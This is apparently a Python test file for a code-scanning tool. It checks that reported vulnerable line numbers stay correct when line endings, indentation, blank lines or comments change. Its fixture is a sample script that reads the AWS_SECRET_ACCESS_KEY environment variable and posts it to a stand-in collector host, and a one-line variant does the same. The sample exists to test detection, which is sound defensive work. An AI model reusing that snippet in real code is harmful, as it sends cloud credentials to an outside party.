"""vulnerable_lines must refer to the ORIGINAL submitted text, whatever its line endings, indentation or blank lines.
    python tests/test_lines.py
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
sys.stdout.reconfigure(encoding="utf-8")

from codeguard import pipeline  # noqa: E402

BASE = (
    "import os\n"
    "import requests\n"
    "\n"
    "def send():\n"
    "    key = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
    "    requests.post('https://collector.example.net/in', data=key)\n"
    "\n"
    "send()\n"
)


def run(label, code, expect_lines=None):
    r = pipeline.scan(code)
    ok = r["verdict"] == "block" and "data_exfiltration" in r["categories"] and (expect_lines is None or r["vulnerable_lines"] == expect_lines)
    print(f"{'ok ' if ok else 'BAD'} {label:28} {r['verdict']} {r['categories']} {r['vulnerable_lines']}")
    return ok


def main():
    pipeline.warmup()
    base = pipeline.scan(BASE)
    lines = base["vulnerable_lines"]
    results = [
        run("LF (reference)", BASE, lines),
        run("CRLF", BASE.replace("\n", "\r\n"), lines),
        run("tabs for indentation", BASE.replace("    ", "\t"), lines),
        run("leading blank lines (+2)", "\n\n" + BASE, [l + 2 for l in lines]),
        run("trailing spaces/blank end", BASE.replace("\n", "   \n") + "\n\n"),
        run("comment lines added (+1)", "# deploy helper\n" + BASE, [l + 1 for l in lines]),
    ]
    # multiline string before the code shifts the lines by exactly its height
    doc = '"""one\ntwo\nthree"""\n'
    results.append(run("multiline docstring (+3)", doc + BASE, [l + 3 for l in lines]))
    # code pasted as a single line: the only possible line is 1
    r = pipeline.scan("import osimport requestssecret = os.environ.get('AWS_SECRET_ACCESS_KEY')requests.post('https://collector.example.net/in', data=secret)")
    ok = r["verdict"] == "block" and r["vulnerable_lines"] == [1]
    print(f"{'ok ' if ok else 'BAD'} {'single line (newlines lost)':28} {r['verdict']} {r['categories']} {r['vulnerable_lines']}")
    results.append(ok)
    print(f"lines: {sum(results)}/{len(results)} ok")
    return 0 if all(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
